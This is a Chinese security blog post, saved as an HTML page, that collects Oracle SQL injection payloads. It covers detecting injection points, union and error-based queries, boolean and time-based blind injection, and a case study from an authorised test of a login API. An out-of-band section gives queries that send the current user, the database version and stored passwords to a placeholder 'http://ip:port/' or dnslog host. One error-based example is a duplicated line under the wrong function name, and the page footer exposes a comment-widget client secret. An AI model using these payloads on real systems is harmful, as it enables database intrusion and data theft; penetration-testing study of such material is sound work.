@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="loecho">
+<meta name="description" content="安全行业的从业人员">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                <!--点击特效-->
+                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
+                
+                        <!--CDN样式-->
+                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://1oecho.github.io">
+                    
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                        Index
+                    </a>
+                    
+                    <a class="menu-item" href="https://1oecho.github.io/tags">
+                        Tags
+                    </a>
+                    
+                    <a class="menu-item" href="https://github.com/loecho-sec">
+                        Whoami
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://1oecho.github.io">
+                            
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                            Index
+                        </a>
+                        
+                        <a class="menu-item" href="https://1oecho.github.io/tags">
+                            Tags
+                        </a>
+                        
+                        <a class="menu-item" href="https://github.com/loecho-sec">
+                            Whoami
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                知识汇总: Oracle  注入 All in ONE
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-06-24</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">8.1
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">1936</a></span>
+                                        
+                                            <span class="post-category">&#x5206;&#x7C7B;:
+                                
+                                <a href="https://1oecho.github.io/kxNen4dTe/">Something</a>
+                                
+                            </span>
+                                            
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <p><code>Oracle</code> 数据库常用于一些大型公司,平常都配合Java的后端来使用，在企业以及各类主流单位都作为主要数据库,平时在测试中也经常遇到注入漏洞,所以就总结一下,注入过程,从注入判断到数据的获取,全过程记录,包含一个典型实际案例</p>
+<h2 id="0x01-寻找并判断注入点">0x01 寻找并判断注入点</h2>
+<h3 id="注意避免使用-and-11这样的测试语句">注意：避免使用 <code>and 1=1</code>这样的测试语句</h3>
+<h4 id="数字型">数字型:</h4>
+<p>数字型的注入,和其他类型数据库时都一样,自己构造<code>加减乘除</code>的条件来判断注入</p>
+<h3 id="payload">Payload:</h3>
+<pre><code class="language-sql">#通过 &lt;&gt; 来判断
+
+?id=1'+and+1&lt;&gt;2--+ #返回为真 页面正常
+?id=1'+and+1&lt;&gt;1--+ #返回为假 页面异常
+
+#通过 加减法来判断
+
+?id=1 #返回id,为1的内容
+?id=2-1  #返回为1的内容
+
+#通过数据库报错来判断
+
+?id=1 #返回为正常
+?id=1/0 #返回异常
+
+# 通过注释符来判断(多行注释:/**/,单行注释:--)
+
+?id=1 #返回为正常
+?id=1/*loecho*/ #也返回正常
+
+?id=1 #返回为正常
+?id=1--loecho #也返回正常
+</code></pre>
+<h4 id="字符型">字符型</h4>
+<p>字符型注入相对数字型来说,会存在闭合一些数据引用符号的问题,例如语句通过<code>'</code>闭合语句后,后续就要通过单行注释符来注释剩下的单引号,其他情况也是如此</p>
+<h4 id="payload-2">Payload:</h4>
+<pre><code class="language-sql">#通过&lt;&gt;来判断
+
+?name=loecho'+and+1&lt;&gt;6--+ #返回正常
+?name=loecho'+and+1&lt;&gt;1--+ #返回异常
+
+
+#使用字符串拼接符’||’，通过判断拼接符是否执行，从而判断是否存在注入
+
+?name=lo'||'echo #返回正常
+?name=lo'||'haha #返回异常
+</code></pre>
+<h2 id="0x02-利用并且查询数据">0x02 利用并且查询数据</h2>
+<h3 id="01-联合查询">01. 联合查询</h3>
+<p><strong>即利用union select将想要查询的数据显示在页面上</strong>，构造正常语句，成功执行SQL语句查询数据</p>
+<ul>
+<li>具体步骤如下:</li>
+</ul>
+<pre><code class="language-sql"># 01.先判断列数,同Mysql一样
+
+?id=1'+order+by+4--+ #返回正常
+?id=1'+order+by+5--+ #提示报错
+
+得出结论数据为: 5 列
+
+# 02.然后对每一列的数据类型进行判断（可以使用null代替某些无法快速猜测出数据类型的位置），先默认每一列均为null，然后从第一列开始依次将null改为字符串，如果报错则说明该列是数字型，否则则是字符型。,同Mysql一样
+
+?id=1'+union+select+user+null+null+null+from+dual--+ #查询当前用户名
+以此类推
+
+# 03. 利用select table_name from user_tables where rownum=1获取表名（列名table数据同理）：
+
+select column_name from user_tab_columns where table_name='TB_USER' and rownum=1（获取列名）
+select USER_ID from TB_USER where USER_ID=1 and rownum=1（获取数据）
+</code></pre>
+<h3 id="03-报错注入">03. 报错注入</h3>
+<p><strong>构造报错语句，通过数据库报错来带出我们要查询的数据</strong>，常用的报错函数包括</p>
+<ul>
+<li>XMLType()</li>
+</ul>
+<pre><code class="language-sql">
+# 中间为查询语句
+
+upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62)))
+
+</code></pre>
+<ul>
+<li>dbms_xdb_version.checkin()</li>
+</ul>
+<pre><code class="language-sql">
+# 中间为查询语句
+
+upper(dbms_xdb_version.checkin((select user from dual)))
+
+</code></pre>
+<ul>
+<li>ctxsys.drithsx.sn()</li>
+</ul>
+<pre><code class="language-sql">
+# 中间为查询内容
+
+upper(dbms_xdb_version.checkin((select user from dual)))
+
+</code></pre>
+<ul>
+<li>ordsys.ord_dicom.getmappingxpath()</li>
+</ul>
+<pre><code class="language-sql">
+# 中间为查询内容
+
+ordsys.ord_dicom.getmappingxpath(user,user,user)
+
+</code></pre>
+<ul>
+<li>dbms_utility.sqlid_to_sqlhash()</li>
+</ul>
+<pre><code class="language-sql">
+# 中间为查询内容
+
+dbms_utility.sqlid_to_sqlhash((select user from dual))
+
+</code></pre>
+<h3 id="02oob外带数据">02.OOB外带数据</h3>
+<p>通过HTTP请求,或者DNSlog,来构造语句,如果目标出网,并且对数据库函数没有进行限制,就会实现攻击</p>
+<ul>
+<li>HTTP 请求外带数据</li>
+</ul>
+<pre><code class="language-sql">and utl_http.request('http://ip:port/'||(select banner from sys.v_$version where rownum=1))=1--  查询指纹版
+ 
+and utl_http.request('http://ip:port/'%7C%7C(select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual))=1 -- 查询环境
+
+
+and%20 utl_http.request('http://ip:port/'%7c%7c (select user from dual))=1-- 查询当前用户
+
+
+and%20%20utl_http.request(%27http://ip:port/%27%7c%7c(select%20instance_name%20from%20v$instance))=1--查询具体内容
+
+and utl_http.request('http://ip:port/'||(select TABLE_NAME from all_tables where rownum=1))=1-- 查询所有数据表名
+
+select name from v$database;
+
+select instance_name from v$instance;
+
+1.查询所有数据库
+
+由于Oralce没有库名,只有表空间,所以Oracle没有提供数据库名称查询支持，只提供了表空间名称查询。
+select * from v$tablespace;--查询表空间(需要一定权限)
+
+2.查询当前数据库中所有表名
+
+select * from user_tables;
+
+3.查询指定表中的所有字段名
+
+select column_name from user_tab_columns where table_name = 'table_name';
+
+
+4.查询指定表中的所有字段名和字段类型
+
+select column_name, data_type from user_tab_columns where table_name = 'table_name';
+
+</code></pre>
+<ul>
+<li>DSNlog请求外带数据</li>
+</ul>
+<pre><code class="language-sql">
+- UTL_HTTP.REQUEST
+
+select name from test_user where id =1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.dnslog') FROM sys.DUAL;
+
+- DBMS_LDAP.INIT
+
+select name from test_user where id =1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.dnslog',80) FROM sys.DUAL;
+
+
+- HTTPURITYPE 
+
+select name from test_user where id =1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.dnslog').GETCLOB() FROM sys.DUAL;
+
+
+
+- UTL_INADDR.GET_HOST_ADDRESS 
+
+select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.dnslog') FROM sys.DUAL;
+</code></pre>
+<h3 id="03-基于布尔值的盲注">03. 基于布尔值的盲注</h3>
+<p>通过构造不同条件,返回返回页面的不同,就形成了Bool值的注入</p>
+<ul>
+<li>通过 substr()  decode() 函数的盲注(常用)</li>
+</ul>
+<pre><code class="language-sql">
+# 按位截取数据,Bp俩个标记:第一个为截取位数,第二个为:所有字符:
+
+and+1=(select+decode(substr((select user from dual),§1§,1),'§S§',(1),0) from dual)--+ #查 user
+
+and+1=(select decode(substr((select banner from sys.v_$version wher rownum=1),1 ,1),'S',(1),0) from dual)--+ # 查version
+
+and+1=(select decode(substr((select table_name from user_tables where rownum=1),§1§,1),'§S§',(1),0) from dual)--+ # 查表名
+</code></pre>
+<ul>
+<li>通过 case、substr()、ascii() 函数的盲注</li>
+</ul>
+<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):
+  123=(case when ascii(substr(user,§0§,1))=§121§ then '123' else '456' end)--+
+</code></pre>
+<ul>
+<li>通过 case、instr()、chr() 函数的盲注</li>
+</ul>
+<pre><code class="language-sql"># 按位截取数据,Bp俩个标记:第一个为:所有可见字符的ASCII码(32~126): 第二个,第三个为:值相同为截取位数
+123=(case instr(user,chr(§*§),§*§,1) when §*§ then '123' else '456' end)--+
+</code></pre>
+<p>还有其他方式来利用,配合函数,不同环境不同用法</p>
+<h3 id="03-基于时间的盲注">03 .基于时间的盲注</h3>
+<p>时间盲注，<strong>基于服务器返回所用的时间，判断函数是否执行，从而判断是否存在注入</strong></p>
+<ul>
+<li>
+<h3 id="decode-dbms_pipereceive_message-chr-substr利用">Decode()、DBMS_PIPE.receive_message()、chr()、substr()利用</h3>
+</li>
+</ul>
+<pre><code class="language-sql">  # 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):
+'||decode(substr(user,§*§,1),chr(§*§),DBMS_PIPE.receive_message('sen',1),2)||' #查user
+</code></pre>
+<h2 id="0x03-实际案例分析">0x03 实际案例分析</h2>
+<p>某次授权测试,某小程序后端在检查登录时,存在Oracle注入漏洞,注入类型为基于布尔类型的注入</p>
+<ol>
+<li>过滤空格，Json包注入，抓包标记注入点</li>
+<li>因为Sqlmap对于页面差异小布尔判断不准确，所以注入时加上以下任一参数，配合Tamper脚本即可注入成功：</li>
+</ol>
+<p><strong>--string=STRING    查询时有效时在页面匹配字符串</strong><br>
+<strong>--not-string=NOT..  当查询求值为无效时匹配的字符串</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200713213422.png" alt="image-20200713213422628" loading="lazy"></figure>
+<ol>
+<li>或者通过国产的一个工具：<strong>超级SQL注入工具</strong>标记好数据包以及布尔变换和空格替换，都可以成功</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200713213724.png" alt="image-20200713213724264" loading="lazy"></figure>
+<h4 id="手工判断">手工判断</h4>
+<h4 id="条件为真时">条件为真时:</h4>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/image-20200624150048076.png" alt="image-20200624150048076" loading="lazy"></figure>
+<h4 id="条件为假时">条件为假时:</h4>
+<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/image-20200624150153336.png" alt="image-20200624150153336" loading="lazy"></figure>
+<ul>
+<li>由此构造条件来查询数据,当前数据库版本,结果如下</li>
+</ul>
+<h5 id="paylaod">Paylaod:</h5>
+<pre><code class="language-sql">{&quot;tel&quot;:&quot;18848888888/**/and/**/1=(select/**/decode(substr((select/**/banner/**/from/**/sys.v_$version/**/where/**/rownum=1),1 ,1),'S',(1),0)/**/from/**/dual)&quot;}
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog_Img/image-20200429202202524.png" alt="da" loading="lazy"></figure>
+<h2 id="0x04-想法">0x04 : 想法</h2>
+<ol>
+<li>实际测试中,网站直接交互存在注入的概率不是很大,着重测试一些微应用的后端交互，或者后端API</li>
+<li>只要自己成功判断后端执行了我们拼接的SQL语句，就是存在问题，配合数据库特性<code>1/0</code>也是可以的</li>
+<li>搜索处，表单的提交，各类刁钻的地方，只要猜测后端有交互的，都可以测试，会有惊喜！</li>
+</ol>
+
+                        </div>
+                        
+                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/oracle-sqli/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/oracle-sqli/&sharesource=qzone&title=知识汇总: Oracle  注入 All in ONE&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/oracle-sqli/&sharesource=weibo&title=知识汇总: Oracle  注入 All in ONE + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                        
+                        <a href="https://1oecho.github.io/kxNen4dTe/">#
+                    Something
+                        </a>
+                        
+                            
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/cobatstrike-01/">
+                                                                                            红队开发: CobaltStrike-反编译自定义功能学习
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/c-zJSfh0F/">
+                                                                                                    知识汇总: MySQL未知列名的注入Tips
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '61442cf87c4266a18189',
+        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
+        repo: 'loecho',
+        owner: '1oecho',
+        admin: ['1oecho'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        loecho-sec
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                         &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://1oecho.github.io/" target="_blank">
+                                                loecho-sec
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.5
+                </div>
+                
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
+            
+                <script>
+                    
+                    
+                    loadlive2d();
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1702539383157);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
